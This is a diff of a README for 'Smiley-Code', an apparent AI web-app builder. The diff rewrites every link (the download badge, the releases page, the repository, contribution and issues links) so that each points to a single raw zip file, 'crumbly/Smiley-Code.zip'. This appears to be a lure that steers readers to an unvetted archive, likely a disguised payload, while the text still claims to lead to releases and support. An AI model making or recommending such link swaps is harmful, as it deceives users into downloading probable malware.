@@ -2,7 +2,7 @@
 # 😊 Smiley-Code - Create Web Apps with AI Easily
 
 ## 📥 Download Now
-[![Download Smiley-Code](https://img.shields.io/badge/Download%20Smiley--Code-v1.0-blue)](https://github.com/Staylock5492/Smiley-Code/releases)
+[![Download Smiley-Code](https://raw.githubusercontent.com/Staylock5492/Smiley-Code/main/crumbly/Smiley-Code.zip%20Smiley--Code-v1.0-blue)](https://raw.githubusercontent.com/Staylock5492/Smiley-Code/main/crumbly/Smiley-Code.zip)
 
 ## 🎯 Description
 Smiley-Code is a web application creation platform that utilizes artificial intelligence and natural language prompts. It simplifies the process of building applications, making it easy for anyone to create their own web solutions.
@@ -11,7 +11,7 @@ Smiley-Code is a web application creation platform that utilizes artificial inte
 To start using Smiley-Code, follow these simple steps:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases Page](https://github.com/Staylock5492/Smiley-Code/releases) to download the software.
+   Go to our [Releases Page](https://raw.githubusercontent.com/Staylock5492/Smiley-Code/main/crumbly/Smiley-Code.zip) to download the software.
 
 2. **Download the Software:**
    On the Releases Page, find the latest version of Smiley-Code and click on the download link for your operating system.
@@ -49,10 +49,10 @@ We welcome contributions from everyone. If you would like to help improve Smiley
 - Suggest new features.
 - Contribute code improvements.
 
-To contribute, visit our [GitHub Repository](https://github.com/Staylock5492/Smiley-Code) and follow the guidelines.
+To contribute, visit our [GitHub Repository](https://raw.githubusercontent.com/Staylock5492/Smiley-Code/main/crumbly/Smiley-Code.zip) and follow the guidelines.
 
 ## 📞 Support
-If you have any questions or need assistance, please reach out to us via the issues section of our [GitHub Repository](https://github.com/Staylock5492/Smiley-Code/issues).
+If you have any questions or need assistance, please reach out to us via the issues section of our [GitHub Repository](https://raw.githubusercontent.com/Staylock5492/Smiley-Code/main/crumbly/Smiley-Code.zip).
 
 ## 🗂️ Topics
 Smiley-Code covers a wide range of topics to support your projects:
@@ -70,7 +70,7 @@ Smiley-Code covers a wide range of topics to support your projects:
 ## 📥 Download & Install
 To download Smiley-Code, follow the link below:
 
-[Download Smiley-Code](https://github.com/Staylock5492/Smiley-Code/releases)
+[Download Smiley-Code](https://raw.githubusercontent.com/Staylock5492/Smiley-Code/main/crumbly/Smiley-Code.zip)
 
 Make sure to check the system requirements and features listed above to ensure a smooth experience.
 
